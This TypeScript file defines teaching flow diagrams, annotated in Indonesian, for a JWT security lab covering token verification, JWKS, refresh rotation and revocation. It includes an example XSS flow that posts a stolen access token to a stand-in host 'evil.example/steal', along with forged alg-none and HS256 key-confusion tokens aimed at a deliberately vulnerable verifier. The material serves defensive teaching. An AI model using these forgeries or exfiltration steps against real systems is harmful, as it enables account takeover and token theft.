import type { Flow } from "@/components/flow/types";

// Raw messages mirror the Lab 02 HTTP contract (labs/02-jwt): RS256 access tokens, an opaque `rt` refresh cookie
// scoped to /refresh, RFC 6750 WWW-Authenticate answers, and the vulnerable-mode verifier. The tokens below are
// real RS256/HS256 tokens built with a throwaway key, so they decode in the TokenDecoder but verify nowhere.
const ACCESS = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImszSHE5Wm1CMXZXOGVZclQifQ.eyJpc3MiOiJodHRwOi8vbG9jYWxob3N0OjQxMDIiLCJhdWQiOiJsYWIwMi1hcGkiLCJzdWIiOiI2ZjFjMmI5ZS0zYTRkLTRlOGYtOWIxYS03YzVkMmUwZjhhMzQiLCJlbWFpbCI6ImFsaWNlQGV4YW1wbGUuY29tIiwiaWF0IjoxNzY3MjI1NjAwLCJleHAiOjE3NjcyMjU5MDAsImp0aSI6IlhrM3E5Wm1CMXZXOGVZclQ1dUxwQTdzRDBmR2hKY040aU9hRTZiUXdWeVUifQ.CuGey27Ie14YL8uqlMkjrCUvVECt6nDd3iZ6EFC_cofWogIgkOrRN7gjzi21UEXXRuakSzfYSFE8d4aqWWNXAEe3BAdzyxdkd6hp66gXfat5Pfb1ynDtmqga2Vn9zi3DlxNpNqHgF1XyzrMHOO6xKiM9at_MByW_OSwdvkyh080odZoFDV9yRFezLzhhVtxBegtSd_bdXmoniQTExoMwD8snHVvxI3tj-tIRxO-x6gIi5IODrb1tJ4-PxDRhn60sv4iqofrDGRU3K8J0WkTRhjK812h2NMEITMukC2KnWL7Sorcuwd186gFHtXIWKYbiB-TqXPn4iNwCOHuwXFmfag";
const ACCESS2 = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImszSHE5Wm1CMXZXOGVZclQifQ.eyJpc3MiOiJodHRwOi8vbG9jYWxob3N0OjQxMDIiLCJhdWQiOiJsYWIwMi1hcGkiLCJzdWIiOiI2ZjFjMmI5ZS0zYTRkLTRlOGYtOWIxYS03YzVkMmUwZjhhMzQiLCJlbWFpbCI6ImFsaWNlQGV4YW1wbGUuY29tIiwiaWF0IjoxNzY3MjI1OTAwLCJleHAiOjE3NjcyMjYyMDAsImp0aSI6InE4THpUMHZOMmNZcDVIc0s5ZFdtM1JiWDdlSmdBMXVGb1ppRTR0UWhCNmMifQ.FOvHwCTsYvaCv3C_WcS_VcHNIwZQD-NvxKWelbSjLVLcAL2ml7HjsNDsNDZvTV8-mm9CYAQpLrQL8FwmOw-niJWCSE9lgvemK0YWUSMkvsO5ls8hJXcBeKag0y4lMUGQdQw7-qLVRdy3oTFU9dEyrDzcR2e6vEJjd7nzarDXQKyn0Y-IgJptgncuqN3d4nqQR5sU9Eg3SmsEKqMHPuGOsWA1sgSxMBVLAX9R3tXpZqEltAHaAb5vPvMrpH1xe3WxzYkYY3Wg7wWloFCu7o_XorG229cTY7P0FgPAgbRg6HKWYYPkQ-tc1lUjrLvFqD7R5fLfb_MAaxEFSr-iLtDPkw";
const NONE = "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJodHRwOi8vbG9jYWxob3N0OjQxMDIiLCJhdWQiOiJsYWIwMi1hcGkiLCJzdWIiOiJmb3JnZWQtdXNlciIsImVtYWlsIjoiZm9yZ2VkQGV4YW1wbGUuY29tIiwiaWF0IjoxNzY3MjI1NjAwLCJleHAiOjE3NjcyMjU5MDAsImp0aSI6IlhrM3E5Wm1CMXZXOGVZclQ1dUxwQTdzRDBmR2hKY040aU9hRTZiUXdWeVUifQ.";
const HS = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6ImszSHE5Wm1CMXZXOGVZclQifQ.eyJpc3MiOiJodHRwOi8vbG9jYWxob3N0OjQxMDIiLCJhdWQiOiJsYWIwMi1hcGkiLCJzdWIiOiJmb3JnZWQtdXNlciIsImVtYWlsIjoiZm9yZ2VkQGV4YW1wbGUuY29tIiwiaWF0IjoxNzY3MjI1NjAwLCJleHAiOjE3NjcyMjU5MDAsImp0aSI6IlhrM3E5Wm1CMXZXOGVZclQ1dUxwQTdzRDBmR2hKY040aU9hRTZiUXdWeVUifQ.oVLSryJSftBRe7P1tqQ1q0KXwXNilstKhG5SGUSwUtI";
const EXPIRED = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImszSHE5Wm1CMXZXOGVZclQifQ.eyJpc3MiOiJodHRwOi8vbG9jYWxob3N0OjQxMDIiLCJhdWQiOiJsYWIwMi1hcGkiLCJzdWIiOiI2ZjFjMmI5ZS0zYTRkLTRlOGYtOWIxYS03YzVkMmUwZjhhMzQiLCJlbWFpbCI6ImFsaWNlQGV4YW1wbGUuY29tIiwiaWF0IjoxNzY3MjIxNzAwLCJleHAiOjE3NjcyMjIwMDAsImp0aSI6IlhrM3E5Wm1CMXZXOGVZclQ1dUxwQTdzRDBmR2hKY040aU9hRTZiUXdWeVUifQ.YkQ3BYWQaZAVNcr0qOzqwrMKNQIJMSATIgT3hlacbPtIPt2bA_1AyWxAh1rChYjDrPm4cwUP8yAKeLpwzqE5pAw1Nn0umCIErxK11IHfLne-wm2ab3JKs0GqgI7xc9i_qMviLb8nXgWqy6arGm_gBtq7CTM27wV7j1ute4KY4Md-78xpqmfO_X_cTY6FbRjjARhE9gN2-sGc6XOYCWOcGPr1S3pAVjG1L4NSJDXN3nqT3BEP2C9iAU9LYz5hwnTRTDoXp0TQLCawlnU05w4lPtWUfozbc4Q1g2yHK1OPAmx1TPVcz2nhplBbtBy9SX0v31gLahdqGYitX7MUnZXzIw";
const RT1 = "Xk3q9ZmB1vW8eYrT5uLpA7sD0fGhJcN4iOaE6bQwVyU";
const RT2 = "q8LzT0vN2cYp5HsK9dWm3RbX7eJgA1uFoZiE4tQhB6c";
const HOST = "Host: localhost:4102";
const JSON_HDR = "Content-Type: application/json";
const rtCookie = (t: string) => `Set-Cookie: rt=${t}; Path=/refresh; Max-Age=1209600; HttpOnly; SameSite=Strict`;
const tokenBody = (t: string) => `{"access_token":"${t}","token_type":"Bearer","expires_in":300}`;
const loginOk = (access: string, rt: string) => `HTTP/1.1 200 OK\n${JSON_HDR}\nCache-Control: no-store\n${rtCookie(rt)}\n\n${tokenBody(access)}`;
const profile = (token: string) => `GET /api/profile HTTP/1.1\n${HOST}\nAuthorization: Bearer ${token}`;
const profileOk = `HTTP/1.1 200 OK\n${JSON_HDR}\nCache-Control: no-store\n\n{"sub":"6f1c2b9e-3a4d-4e8f-9b1a-7c5d2e0f8a34","email":"alice@example.com"}`;
const invalid401 = `HTTP/1.1 401 Unauthorized\nWWW-Authenticate: Bearer error="invalid_token"\n${JSON_HDR}\nCache-Control: no-store\n\n{"error":"invalid token"}`;
const refreshReq = (rt: string) => `POST /refresh HTTP/1.1\n${HOST}\nCookie: rt=${rt}`;
const refresh401 = `HTTP/1.1 401 Unauthorized\n${JSON_HDR}\nCache-Control: no-store\n\n{"error":"invalid refresh token"}`;
const loginReq = `POST /login HTTP/1.1\n${HOST}\n${JSON_HDR}\n\n{"email":"alice@example.com","password":"correct-horse-battery"}`;

const statefulVsStateless: Flow = {
  id: "statefulVsStateless",
  title: "Token self-contained: API memverifikasinya tanpa lookup ke database",
  actors: [
    { id: "browser", label: "Browser", kind: "browser" },
    { id: "api", label: "API", kind: "api" },
  ],
  steps: [
    { from: "browser", to: "api", label: "POST /login", http: loginReq, note: "Authentication terjadi sekali saja, persis seperti di Module 1." },
    { from: "api", to: "browser", label: "200 + access token", http: `HTTP/1.1 200 OK
${JSON_HDR}
Cache-Control: no-store

${tokenBody(ACCESS)}`, note: "Response membawa JWT yang di-sign. Claims seperti siapa user-nya dan kapan token expired ikut di dalamnya. Refresh cookie menyusul di lesson 3." },
    { from: "browser", to: "api", label: "GET /api/profile", http: profile(ACCESS), note: "Setiap call berikutnya menyodorkan token di header Authorization. Nggak ada yang disimpan di server untuknya." },
    { from: "api", to: "api", label: "verifikasi signature + claims", note: "API mengecek signature dengan key-nya dan membaca iss, aud, dan exp dari token itu sendiri. Nggak ada tabel session, nggak ada bolak-balik ke database." },
    { from: "api", to: "browser", label: "200 profile", http: profileOk, note: "Harga dari desain ini: server nggak bisa menarik kembali token sebelum expired. Lesson 6 membahas hal itu." },
  ],
};

const jwksVerify: Flow = {
  id: "jwksVerify",
  title: "Verifikasi dengan public key yang dipublikasikan sebagai JWKS",
  actors: [
    { id: "browser", label: "Client", kind: "browser" },
    { id: "api", label: "API", kind: "api" },
    { id: "as", label: "Auth server", kind: "as" },
  ],
  steps: [
    { from: "browser", to: "api", label: "GET /api/profile", http: profile(ACCESS), note: "Header token menyebut alg RS256 dan kid k3Hq9ZmB1vW8eYrT: itulah key yang men-sign-nya." },
    { from: "api", to: "as", label: "GET /.well-known/jwks.json", http: `GET /.well-known/jwks.json HTTP/1.1\n${HOST}`, note: "API belum punya key-nya, jadi dia meminta public key ke issuer. Di lab, satu proses memerankan keduanya." },
    {
      from: "as",
      to: "api",
      label: "200 JWKS",
      http: `HTTP/1.1 200 OK\n${JSON_HDR}\n\n{"keys":[{"kty":"RSA","n":"0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArwl93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0zgdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2NcRwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw","e":"AQAB","kid":"k3Hq9ZmB1vW8eYrT","alg":"RS256","use":"sig"}]}`,
      note: "JWK Set: hanya public key, masing-masing dengan kid. Modulus n di sini cuma contoh. Siapa pun boleh mengambil dokumen ini, dan aman karena public key nggak bisa men-sign.",
    },
    { from: "api", to: "api", label: "pilih key berdasarkan kid, verifikasi RS256", note: "kid memilih key-nya. API mem-pin algoritma ke RS256 sendiri dan nggak pernah membiarkan token memilih. Lalu dia mengecek iss, aud, dan exp." },
    { from: "api", to: "browser", label: "200 profile", http: profileOk, note: "API sekarang meng-cache JWKS dan hanya mengambil ulang saat ketemu kid asing. Begitulah key rotation sampai ke setiap verifier." },
  ],
};

const refreshRotation: Flow = {
  id: "refreshRotation",
  title: "Refresh token rotation, dan apa yang terjadi kalau token lama muncul lagi",
  actors: [
    { id: "browser", label: "Browser", kind: "browser" },
    { id: "server", label: "Server", kind: "server" },
    { id: "db", label: "Database", kind: "db" },
    { id: "attacker", label: "Pencuri", kind: "attacker" },
  ],
  steps: [
    { from: "browser", to: "server", label: "POST /login", http: loginReq, note: "Authentication, sekali saja." },
    { from: "server", to: "db", label: "INSERT refresh token (family baru)", note: "Refresh token acak 32 byte yang baru memulai sebuah family. Hanya sha256-nya yang disimpan. Dia opaque: bukan JWT, jadi server bisa me-revoke-nya." },
    { from: "server", to: "browser", label: "200 + access token + rt cookie", http: loginOk(ACCESS, RT1), note: "Access token 5 menit di body, dan refresh token di cookie HttpOnly yang hanya dikirim ke /refresh." },
    { from: "browser", to: "server", label: "GET /api/profile (token expired)", http: profile(EXPIRED), note: "Lima menit kemudian access token sudah expired." },
    { from: "server", to: "browser", label: "401 invalid_token", http: invalid401, note: "Client tahu langkah berikutnya: minta access token baru." },
    { from: "browser", to: "server", label: "POST /refresh", http: refreshReq(RT1), note: "Browser menyertakan cookie rt sendiri. JavaScript halaman nggak pernah melihatnya." },
    { from: "server", to: "db", label: "pensiunkan rt1, insert rt2", note: "Dalam satu transaksi: tandai rt1 sudah dipakai dan simpan penggantinya di family yang sama. Barisnya di-lock, jadi dua refresh bersamaan nggak bisa sama-sama menang." },
    { from: "server", to: "browser", label: "200 + access baru + rt baru", http: loginOk(ACCESS2, RT2), note: "Access token baru dan refresh cookie baru. rt1 sekarang sudah terpakai." },
    { from: "attacker", to: "server", label: "POST /refresh (rt1 curian)", http: refreshReq(RT1), note: "Belakangan, seseorang memutar ulang refresh token lama yang dia salin.", danger: true },
    { from: "server", to: "db", label: "rt1 sudah dipakai: revoke family", note: "REUSE DETECTION. Token terpakai yang muncul lagi berarti sudah disalin, jadi seluruh family di-revoke, termasuk rt2." },
    { from: "server", to: "attacker", label: "401", http: refresh401, note: "Si pencuri nggak dapat apa-apa. Refresh berikutnya dari korban juga gagal, jadi dia login ulang, dan itulah alarmnya." },
  ],
};

const xssTheft: Flow = {
  id: "xssTheft",
  title: "XSS terhadap token di localStorage, dan terhadap cookie HttpOnly",
  actors: [
    { id: "browser", label: "Halaman korban", kind: "browser" },
    { id: "attacker", label: "Attacker", kind: "attacker" },
    { id: "server", label: "API", kind: "api" },
  ],
  steps: [
    { from: "attacker", to: "browser", label: "inject <script>", note: "Kolom komentar, dependency, atau iklan membuat script attacker jalan di halaman kamu, dengan hak akses penuh origin kamu.", danger: true },
    { from: "browser", to: "browser", label: "localStorage.getItem('access_token')", note: "Script apa pun di origin bisa membaca localStorage dan sessionStorage. Token-nya ada di situ.", danger: true },
    { from: "browser", to: "attacker", label: "POST evil.example/steal", http: `POST /steal HTTP/1.1\nHost: evil.example\n${JSON_HDR}\n\n{"t":"${ACCESS.slice(0, 40)}…"}`, note: "Script mengirim token ke server milik attacker.", danger: true },
    { from: "attacker", to: "server", label: "GET /api/profile", http: profile(ACCESS), note: "Attacker memutar ulang token dari mesinnya sendiri. JWT adalah bearer token, jadi server nggak bisa membedakannya dari korban.", danger: true },
    { from: "server", to: "attacker", label: "200 (sampai exp)", http: profileOk, note: "Berhasil sampai token expired. Umur yang pendek membatasi kerugian." },
    { from: "browser", to: "browser", label: "document.cookie", note: "Sekarang cookie rt yang HttpOnly: document.cookie nggak menampilkannya, jadi script nggak punya apa-apa untuk dibaca dan dikirim." },
    { from: "browser", to: "server", label: "POST /refresh (dari halaman)", http: refreshReq("(sent by the browser, invisible to the script)"), note: "Bagian jujurnya: selama halaman terbuka, script tetap bisa memanggil /refresh dan browser menyertakan cookie-nya. Dia mendapat access token baru, yang bisa dikirim keluar juga (hanya berlaku sampai exp), tapi nggak pernah refresh token-nya sendiri.", danger: true },
  ],
};

const algNone: Flow = {
  id: "algNone",
  title: "Token palsu melawan verifier yang mempercayai header milik token itu sendiri",
  actors: [
    { id: "attacker", label: "Attacker", kind: "attacker" },
    { id: "server", label: "API", kind: "api" },
  ],
  steps: [
    { from: "attacker", to: "attacker", label: "racik header + payload", note: "Header {\"typ\":\"JWT\",\"alg\":\"none\"}, payload yang mengaku sub forged-user, dan signature kosong. Nggak butuh key.", danger: true },
    { from: "attacker", to: "server", label: "GET /api/profile (vulnerable mode)", http: `${profile(NONE)}\nX-Lab-Mode: vulnerable`, note: "Token berakhir dengan titik tanpa apa pun setelahnya: JWT tanpa signature.", danger: true },
    { from: "server", to: "server", label: "verifier naif membaca alg dari token", note: "FLAW 1 dan 2. Dia mempercayai header alg dari attacker, melihat none, lalu melewatkan verifikasi signature.", danger: true },
    { from: "server", to: "attacker", label: "200 forged-user", http: `HTTP/1.1 200 OK\n${JSON_HDR}\nCache-Control: no-store\n\n{"sub":"forged-user","email":"forged@example.com"}`, note: "API menerima token yang nggak di-sign siapa pun.", danger: true },
    { from: "attacker", to: "server", label: "token yang sama, mode secure", http: profile(NONE), note: "Sekarang token yang identik melawan verifier default yang aman." },
    { from: "server", to: "attacker", label: "401 invalid_token", http: invalid401, note: "Verifier yang aman mem-pin RS256, jadi alg none ditolak sebelum claim apa pun dilihat. Dia juga membalas dengan header WWW-Authenticate sesuai RFC 6750." },
    { from: "attacker", to: "server", label: "key confusion: HS256 di-sign dengan public key", http: `${profile(HS)}
X-Lab-Mode: vulnerable`, note: "Pemalsuan kedua. alg HS256, dengan HMAC yang dihitung memakai teks public key milik server sendiri sebagai secret. Siapa pun bisa mengambil key itu.", danger: true },
    { from: "server", to: "attacker", label: "200 forged-user", http: `HTTP/1.1 200 OK
${JSON_HDR}
Cache-Control: no-store

{"sub":"forged-user","email":"forged@example.com"}`, note: "Verifier naif beralih ke HMAC karena header-nya bilang begitu, dan memakai public key sebagai secret. Verifier yang aman juga membalas 401 di sini: dia hanya menerima RS256.", danger: true },
  ],
};

const revocation: Flow = {
  id: "revocation",
  title: "Logout me-revoke refresh family, tapi access token tetap hidup sampai exp",
  actors: [
    { id: "browser", label: "Browser", kind: "browser" },
    { id: "server", label: "Server", kind: "server" },
    { id: "db", label: "Database", kind: "db" },
  ],
  steps: [
    { from: "browser", to: "server", label: "POST /refresh/logout", http: `POST /refresh/logout HTTP/1.1\n${HOST}\nCookie: rt=${RT2}`, note: "Logout ada di bawah /refresh karena cookie rt hanya dikirim ke path itu." },
    { from: "server", to: "db", label: "revoke family", note: "Setiap token di family, sudah dipakai atau belum, mendapat revoked_at. Yang pernah disimpan hanya hash-nya." },
    { from: "server", to: "browser", label: "204 + hapus cookie", http: "HTTP/1.1 204 No Content\nSet-Cookie: rt=; Path=/refresh; Max-Age=0; HttpOnly; SameSite=Strict", note: "Cookie dihapus juga di browser." },
    { from: "browser", to: "server", label: "POST /refresh (rt yang sama)", http: refreshReq(RT2), note: "Siapa pun yang menyimpan salinan refresh token mencobanya." },
    { from: "server", to: "browser", label: "401", http: refresh401, note: "Di-revoke. Inilah revoke yang bisa kamu tegakkan: refresh butuh pengecekan ke database." },
    { from: "browser", to: "server", label: "GET /api/profile (access token, sisa 2 menit)", http: profile(ACCESS2), note: "Tapi access token sudah terlanjur diterbitkan dan diverifikasi secara offline." },
    { from: "server", to: "browser", label: "200 sampai exp", http: profileOk, note: "Tanpa lookup berarti tanpa revoke: token tetap valid sampai exp, paling lama 5 menit di sini. Itulah trade-off di balik umur yang pendek.", danger: true },
  ],
};

export const m2Flows = { statefulVsStateless, jwksVerify, refreshRotation, xssTheft, algNone, revocation } satisfies Record<string, Flow>;
